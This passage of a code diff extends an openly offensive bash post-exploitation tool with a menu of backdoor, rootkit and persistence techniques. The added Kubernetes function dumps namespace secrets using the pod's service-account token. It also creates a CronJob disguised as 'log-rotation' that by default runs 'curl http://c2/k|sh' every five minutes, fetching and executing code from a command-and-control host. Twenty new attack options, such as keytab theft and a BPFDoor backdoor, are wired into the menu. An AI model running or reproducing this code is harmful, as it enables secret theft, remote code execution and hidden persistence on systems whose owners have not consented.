+           mkdir -p "$WORKDIR"; curl -sk -H "Authorization: Bearer ${TOKEN}" "${API}/api/v1/namespaces/${NS}/secrets" > "${WORKDIR}/secrets.json" 2>/dev/null
+           echo "[+] Secrets saved: ${WORKDIR}/secrets.json" ;;
+        3) TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
+           NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null); NS="${NS:-default}"
+           API="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
+           [[ -z "$TOKEN" ]] && { echo "[-] No token"; return; }
+           read -p "Command: " CMD; CMD="${CMD:-curl http://c2/k|sh}"
+           curl -sk -X POST -H "Authorization: Bearer ${TOKEN}" -H "Content-Type: application/json" \
+             "${API}/apis/batch/v1/namespaces/${NS}/cronjobs" \
+             -d '{"apiVersion":"batch/v1","kind":"CronJob","metadata":{"name":"log-rotation"},"spec":{"schedule":"*/5 * * * *","jobTemplate":{"spec":{"template":{"spec":{"containers":[{"name":"r","image":"alpine","command":["/bin/sh","-c","'"${CMD}"'"]}],"restartPolicy":"Never"}}}}}}' 2>/dev/null | grep -q "log-rotation" && echo "[+] CronJob created" || echo "[-] Failed" ;;
+        4) rm -rf "$WORKDIR"; echo "[+] Cleaned" ;;
+    esac
+}
+
 banner() {
     :
 }
@@ -4613,6 +5126,31 @@ menu() {
                                   [85] Cgroup Release Agent Escape (T1611)
                                   [86] Screen/Tmux Session Hijack (T1563.001)
                                   [87] ELF Parasitic Code Injection (T1554)
+
+                ═══════════════════════════════════════════════════════
+                            Cutting-Edge Techniques (2024-2026)
+                ═══════════════════════════════════════════════════════
+
+                                  [88] io_uring Rootkit Operations (T1562.001)
+                                  [89] BPFDoor Magic Packet Backdoor (T1205.001)
+                                  [90] NFQUEUE Userspace Backdoor (T1571)
+                                  [91] SO_REUSEPORT Socket Hijack (T1557)
+                                  [92] Abstract Unix Socket Hijack (T1559)
+                                  [93] FUSE Filesystem Hiding (T1564.001)
+                                  [94] D-Bus Method Interception (T1559.001)
+                                  [95] GnuPG Agent Hijack (T1552.004)
+                                  [96] Kerberos Keytab Theft (T1558.003)
+                                  [97] WireGuard Peer Injection (T1133)
+                                  [98] GDB Init Persistence (T1546)
+                                  [99] Vim/Neovim Plugin Persistence (T1546)
+                                  [100] Fish/Zsh Completions Persistence (T1547.004)
+                                  [101] Ansible facts.d Persistence (T1072)
+                                  [102] systemd Socket Activation Backdoor (T1543.002)
+                                  [103] inotify Trigger Execution (T1546)
+                                  [104] fanotify File Access Hooking (T1562.001)
+                                  [105] systemd Portable Service Backdoor (T1543.002)
+                                  [106] TIOCSTI Terminal Injection (T1055)
+                                  [107] Kubernetes API Abuse (T1552.007)
 
     [*] Coming soon others features [*]
 
@@ -4796,6 +5334,46 @@ EOF
         screenHijack
     elif [ "$MENUINPUT" == "87" ]; then
         elfInject
+    elif [ "$MENUINPUT" == "88" ]; then
+        iouringRootkit
+    elif [ "$MENUINPUT" == "89" ]; then
+        bpfdoorMagic
+    elif [ "$MENUINPUT" == "90" ]; then
+        nfqueueBackdoor
+    elif [ "$MENUINPUT" == "91" ]; then
+        reuseportHijack
+    elif [ "$MENUINPUT" == "92" ]; then
+        abstractSocket
+    elif [ "$MENUINPUT" == "93" ]; then
+        fuseHide
+    elif [ "$MENUINPUT" == "94" ]; then
+        dbusIntercept
+    elif [ "$MENUINPUT" == "95" ]; then
+        gpgAgentHijack
+    elif [ "$MENUINPUT" == "96" ]; then
+        keytabTheft
+    elif [ "$MENUINPUT" == "97" ]; then
+        wireguardInject
+    elif [ "$MENUINPUT" == "98" ]; then
+        gdbinitPersist
+    elif [ "$MENUINPUT" == "99" ]; then
+        vimPluginPersist
+    elif [ "$MENUINPUT" == "100" ]; then
+        shellCompletions
+    elif [ "$MENUINPUT" == "101" ]; then
+        ansibleFacts
+    elif [ "$MENUINPUT" == "102" ]; then
+        socketActivation
+    elif [ "$MENUINPUT" == "103" ]; then
+        inotifyTrigger
+    elif [ "$MENUINPUT" == "104" ]; then
+        fanotifyHook
+    elif [ "$MENUINPUT" == "105" ]; then
+        portableService
+    elif [ "$MENUINPUT" == "106" ]; then
+        tiocstiInject
+    elif [ "$MENUINPUT" == "107" ]; then
+        k8sAbuse
     else 
         echo "This option does not exist"
     fi
